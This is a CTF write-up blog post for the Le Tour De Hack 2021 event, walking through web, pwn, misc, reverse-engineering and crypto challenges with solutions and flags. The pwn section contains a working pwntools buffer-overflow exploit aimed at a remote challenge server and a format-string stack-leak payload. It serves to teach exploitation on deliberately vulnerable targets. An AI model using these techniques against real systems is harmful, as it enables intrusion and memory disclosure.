---
title: "Le Tour De Hack 2021 CTF WriteUp"
date: 2021-06-21T15:34:30-04:00
categories:
  - CTF Writeups
excerpt: "Le Tour De Hack 2021 was an online CTF event organised by ENUSEC"
tags:
  - CTF
  - ltdh21
  - WriteUp
toc: true
toc_label: "Challenges"
toc_sticky: true
---

![Le Tour De Hack]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/ltdh21.jpg)

[Le Tour De Hack](https://ltdh21.enusec.org/) was an online CTF event organised by [ENUSEC](https://enusec.org/), the Edinburgh Napier Security Society.

This write-up will cover the challenges I solved during the event.

## Web

### Redacted

* Description: You can't see me therefore I must be hidden! 
* Solves: 32

This was a  simple challenge. We are given a webpage with the flag "redacted". Viewing the page source reveals the flag.

```html
<html>

<style>
h1{
text-align: center;
}


</style>

<h1>Classified</h1>

<a>

</a>
<svg width="500" height="500">
  <text x="0" y="15" fill="black">THE FLAG IS</text>
  <text x="100" y="15" fill="black">ltdh21{The_Truth_Is_Out_There}</text>
  <rect width="300" height="20" style="fill:rgb(0,0,0);stroke-width:3;stroke:rgb(0,0,0)" x="100" y="0" />
</svg>
</html>

```

***

### PHP Trickery

* Description: Daaaamn PHP, Back at it again with the crazy logic.
* Solves: 12

When the webpage loads it returns the message "Fail". The source code contains the comment `<!-- ?source -->`.
Adding the source parameter reveals the php source code.

```
https://trickery.enusec.org/index.php?source=
```

```php
<?php
include("flag.php");

if(isset($_GET["source"])){
        highlight_file(__FILE__);
}

function inverse($x) {
    return 1/$x;
}

if(isset($_GET["_"])){
    if(strlen($_GET["_"]) < 8){
        if(inverse($_GET["_"]) < -50000000) {
            die($flag);
        }
    }
}

echo("Fail");
?>
```

We can see that in order to reveal $flag we need to pass a number to the _ parameter, this number must be smaller than -50000000 after the inverse function. The number must also be less than 8 characters long. I first tried using hex however we need to pass a negative number and the strlen() function would include the 0x part of 0x0000 therefore hex wont work.

To provide a small enough negative number we can use scientific notation. The number `-1e-9` will pass the tests.

```
https://trickery.enusec.org/index.php?_=-1e-9

ltdh21{WhAts_B1gg3r_INF_or_Negative_INF}
```

***


### Exception not Found

* Description: Sometimes I get a call from my bank, and the first thing they ask is, 'Mr. Mitnick, may I get your account number?' And I'll say, 'You called me! I'm not giving you my account number!
* Solves: 11

Similar to php trickery adding the source= parameter reveals the php source:

```php
<?php
include("flag.php");
if(isset($_GET["source"])){
    highlight_file(__FILE__);
}

function inverse($x, $flag) {
    if($x == ""){
    throw new Exception("Not today Sucker");
    }
    if (!$x) {
        throw new Exception($flag);
    }
    return 1/$x;
}

try {
    if(isset($_GET["_"])){
        echo "Your answer is: " . inverse($_GET["_"], $flag) . "<br>";
    }
} catch (Exception $e) {
    echo 'Caught exception: ',  $e->getMessage(), "\n";
}
?>
```

This looks similar to PHP Trickery, again we need to supply a number to the _ parameter. This time we need to throw the exception that calls $flag. We can do this by setting _ = 0. 

```
https://exception.enusec.org/index.php?_=0

Caught exception: ltdh21{D0S_By_D1v1si0n}
```

***

## Pwn

### Pwn101

* Description: For the average home-user, anti-virus software is a must.
* Solves: 10


For the challenge we are provided main.c, a main binary and a nc session which runs the same binary remotely.

main.c:

```c
#include <string.h>
#include <stdio.h> 

void secret() {
  puts("ltdh21{N0t_T0dAy_SuCK3r5}\n");
}

void name() {
  puts("What is your name: ");
  char str[20]; 
    gets(str);
    printf("Hello %s\n", str); 
}  

int main( int argc, char** argv ) {
    printf("There is a secret at: %p\n", secret);
    name();
    return 0; 
}
```

This is a simple buffer overflow challenge. Running the binary we are promped to provide a name, which is the printed to screen. The binary also provides the memory address of the secret() function.

```bash
$ ./main 
There is a secret at: 0x5660020d
What is your name: 
JDMCE
Hello JDMCE

```

This address changes each time the binary is run so we will have to extract that in our exploit script.

We can cause a segmentation fault by overflowing the input buffer which the source tells us is str[20]. Using gdb/gef I determined the offset required to overwrite $eip which is 32, we can now write an exploit script

```python
#!/usr/bin/env python3

from pwn import *
import re

#p = process('./main')

p = remote("206.189.123.169", 5001)

output = p.recvline()
log.info(output)

win_addr = re.findall("0[xX][0-9a-fA-F]+", str(output))
win_addr = int(win_addr[0], base=16)
log.info(f"Win address = {win_addr}")

offset = 32
junk = b'A' * offset

payload = [junk, p32(win_addr)]
payload = b"".join(payload)

p.sendline(payload)

p.interactive()

```

```bash
$ python3 exp.py
[+] Opening connection to 206.189.123.169 on port 5001: Done
[*] There is a secret at: 0x5662620d
[*] Win address = 1449288205
[*] Switching to interactive mode
What is your name: 
bbV
ltdh21{Y0u_JuST_Pwn3d_Th1s_BaD_Bo1s}

```

***


### Leak Monster

* Description: Can someone call a plumber?
* Solves: 10

For this challenge we are provided main.c and a nc session.

main.c:

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char text[1024];
    char flag[] = "AAAA";
    printf("Whats your Name Mr plumber: ");
    fgets(text, 1024 , stdin);
    printf("Hello  there ");
    printf(text);
    printf("\n");
    return(0);
}

```

The source code is a textbook example of how not to use the printf() function. We can exploit this using %x string formatting.

The following input leaks the stack.

```bash
$ nc 206.189.123.169 5000       
Whats your Name Mr plumber: AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
Hello  there AAAA00000400.f7ee1580.5662424b.f7cff4d4.f7ee97c0.f7ee9110.ffd61754.00000009.00000001.f7d0268c.64746cd8.7b313268.336d3053.5f336e6f.4c6c4163.505f415f.424d756c.007d7233.41414141.78383025.

```

The leading AAAA acts as a marker, we find the resulting 41414141 in the stack and look at the preceding bytes. Using cyberchef I swap the endianness and convert from hex to get the flag.

![Leak]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/leakflag.jpg)



## Misc

### oooo some Latine

* Description: George indiget aliquo auxilio, non potest se adiuvare vos?
* Solves: 23

We are given a nc session to join

```bash
$ nc 167.99.86.217 9000
                                       ._ o o
                                      \_`-)|_
                                   ,""       \ 
                                 ,"  ## |   ಠ ಠ. 
                               ," ##   ,-\__    `.
                             ,"       /     `--._;)
                           ,"     ## /
                         ,"   ##    /
    
                        
87 104 97 116 32 105 115 32 116 104 101 32 76 97 116 105 110 32 102 111 114 32 102 108 97 103 63
enter "exit" to quit
George: 
```

The ascii reads:

```
What is the Latin for flag?
```

The latin for flag is vexillum. Typing vexillum into the prompt return the ascii values, typing in the asci values returns the flag

```
George: vexillum
vexillum
118 101 120 105 108 108 117 109
87 104 97 116 32 105 115 32 116 104 101 32 76 97 116 105 110 32 102 111 114 32 102 108 97 103 63
enter "exit" to quit
George: 118 101 120 105 108 108 117 109
118 101 120 105 108 108 117 109
You have found the flag! ltdh21{L4t1n_1s_t00_34sy}
87 104 97 116 32 105 115 32 116 104 101 32 76 97 116 105 110 32 102 111 114 32 102 108 97 103 63
enter "exit" to quit
George: 

```

***

### Don't Ascii Me Again

* Description: Stop Ascii me questions!
* Solves: 16

Again we are given a nc session to connect to. We are given a long list of numbers and told to decode the message to get the flag. 

I noticed that typing in a character at the prompt returns 5 numbers, repeating the character changes the numbers, however the numbers always add up to the ascii value of the character

```
: a

57 6 9 22 3 
: a

8 31 9 33 16 
: 

57+6+9+22+3=97=a
```

To decode the message we need to group the numbers into chunks of 5, sum them then convert to text. I wrote the following python script:

```py
#!/usr/bin/env python3

nums = [10, 10, 11, 33, 8, 69, 9, 17, 3, 3, 38, 13, 5, 34, 18, 12, 31, 18, 16, 31, 24, 10, 10, 57, 10, 5, 4, 2, 1, 20, 3, 34, 20, 32, 8, 2, 12, 57, 37, 2, 24, 1, 4, 62, 9, 3, 9, 5, 3, 12, 8, 37, 19, 5, 50, 4, 18, 13, 26, 40, 6, 33, 30, 2, 37, 18, 30, 11, 1, 39, 8, 4, 27, 46, 26, 11, 12, 11, 1, 74, 37, 25, 2, 29, 8, 11, 12, 1, 17, 3, 2, 8, 15, 1, 6, 25, 36, 1, 9, 2, 11, 6, 12, 2, 1, 35, 69, 11, 3, 1, 60, 10, 27, 4, 10, 9, 12, 37, 23, 36, 3, 50, 33, 4, 18, 12, 5, 9, 62, 12, 11, 7, 2, 8, 4, 47, 10, 21, 8, 22, 66, 6, 5, 4, 24, 2, 14, 17, 45, 29, 21, 31, 3, 21, 25, 10, 8, 3, 7, 4, 35, 13, 9, 27, 32, 16, 4, 66, 23, 2, 3, 2, 3, 7, 17, 7, 17, 23, 43, 15, 11, 34, 26, 1, 38, 13, 25, 2, 13, 49, 55, 22, 12, 19, 3, 37, 13, 12, 6, 46, 18, 24, 29, 19, 19, 2, 7, 2, 12, 9, 53, 16, 19, 4, 29, 14, 35, 3, 11, 48, 12, 23, 61, 9, 12, 3, 6, 14, 8, 1, 6, 55, 17, 14, 24, 23, 10, 6, 58, 7, 3, 41, 2, 48, 3, 5, 23, 31, 37, 20, 6, 7, 12, 5, 2, 30, 3, 8, 3, 56, 14, 34, 2, 1, 60, 12, 4, 10, 10, 69, 15, 10, 25, 30, 30, 39, 1, 54, 6, 3, 1, 18, 5, 6, 2, 6, 8, 29, 42, 31, 4, 49, 47, 2, 2, 24, 11, 39, 7, 24, 39, 1, 34, 5, 36, 7, 2, 15, 2, 6, 10, 43, 12, 27, 6, 5, 18, 4, 78, 16, 5, 10, 6, 6, 5, 8, 46, 13, 33, 4, 31, 46, 7, 6, 7, 7, 52, 12, 23, 16, 9, 39, 22, 6, 24, 10, 2, 3, 9, 8, 49, 8, 16, 7, 39, 19, 8, 13, 36, 35, 6, 16, 47, 9, 39, 18, 21, 5, 47, 17, 8, 36, 13, 21, 22, 6, 4, 1, 18, 3, 24, 29, 9, 19, 17, 7, 25, 40, 13, 16, 4, 12, 1, 9, 6, 21, 9, 8, 13, 46, 15, 1, 11, 4, 1, 5, 1, 32, 9, 61, 43, 12, 4, 15, 37, 2, 14, 57, 34, 3, 17, 27, 1, 14, 44, 3, 4, 6, 3, 16, 7, 12, 19, 2, 57, 15, 2, 36, 37, 20, 65, 9, 14, 10, 2, 3, 9, 1, 12, 7, 13, 11, 53, 24, 15, 23, 32, 3, 36, 7, 3, 24, 24, 5, 44, 3, 5, 42, 51, 4, 41, 4, 23, 31, 12, 38, 23, 15, 23, 18, 22, 24, 38, 26, 5, 8, 1, 10, 9, 4, 89, 14, 2, 4, 3, 5, 6, 43, 38, 22, 12, 16, 15, 10, 58, 26, 7, 33, 20, 13, 31, 5, 25, 23, 15, 28, 2, 28, 14, 29, 4, 1, 25, 8, 77, 36, 8, 19, 36, 16, 16, 1, 1, 20, 6, 3, 12, 11, 1, 5, 20, 75, 9, 2, 2, 9, 15, 21, 19, 52, 19, 14, 58, 3, 6, 12, 17, 34, 18, 23, 10, 12, 12, 13, 3, 6, 13, 1, 18, 11, 15, 15, 41, 20, 32, 5, 12, 3, 19, 16, 30, 1, 15, 30, 28, 3, 19, 14, 5, 11, 10, 20, 9, 12, 4, 2, 9, 29, 10, 3, 3, 13, 21, 55, 3, 6, 22, 67, 12, 5, 30, 44, 1, 3, 36, 7, 10, 17, 8, 9, 15, 5, 15, 1, 19, 5, 8, 5, 12, 25, 10, 35, 7, 56, 13, 9, 18, 15, 6, 47, 33, 16, 30, 5, 35, 56, 6, 10, 28, 4, 22, 12, 4, 13, 1, 6, 13, 8, 33, 39, 32, 6, 7, 5, 57, 1, 31, 12, 3, 48, 33, 11, 37, 36, 4, 24, 6, 7, 4, 7, 4, 7, 7, 1, 29, 2, 2, 4, 10, 30, 5, 27, 51, 20, 22]

def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


numarr = chunks(nums, 5)

for i in numarr:
  print(chr(sum(i)), end="")

```

```bash
$ python3 asci.py          
Hello and welcome, I would like to inform you that doing this by hand would be a long and tedious proccess, ltdh21{7h475_pr377y_wh4ck_y000} 
```

***

### Spot the Difference

* Description: Can you find all the differences? Please circle each difference you find. If you can find all 10 differences you earn a gold star!
* Solves: 15

![Spot the Difference]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/SpotTheDiffimg1.png)

We are given two images. The name of the challenge suggests we diff the two images.

I wrote the following python script to diff the two images and save the result as a new image:

```py
#!/usr/bin/env python3

from PIL import Image
from PIL import ImageChops

image1 = Image.open("image1.png")
image2 = Image.open("image2.png")


difference = ImageChops.difference(image2, imagedif)
difference.save("dif.png")
```

The resulting image looks like this:

![Difference]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/dif.png)

I opened the image in StegSolve and found the flag

![flag]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/spottheflag.jpg)

***


## Reverse Engineering

### Wrong password

* Description: Wrong Password! You failed the vibe check.
* Solves: 18

We are given a main.exe binary. Running strings on the file we find: 

```
$ strings main.exe       
!This program cannot be run in DOS mode.
/(Rich
.text
`.rdata
@.data
.reloc
h@1A

...

DecodePointer
Neve_rules
Input the password: 
Correct password!
Here's the secret ;) : bHRkaDIxe3k0eV95MHVfZjB1bmRfbTN9 
Wrong password, try another
                          
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
                          
...

```

We base 64 decode the secret to reveal the flag.

***

## Crypto 

### In this Book I write

* Description: (7, 6, 3) (8, 2, 8) (1, 10, 6) (3, 8, 1) (2, 8, 2)
* Solves: 23

We are given a txt file and the description above. Each set of 3 numbers referse to the (paragraph, line, word), by counting each one out manually we can construct the flag

```
ltdh21{found_my_flag_for_me}
```

***
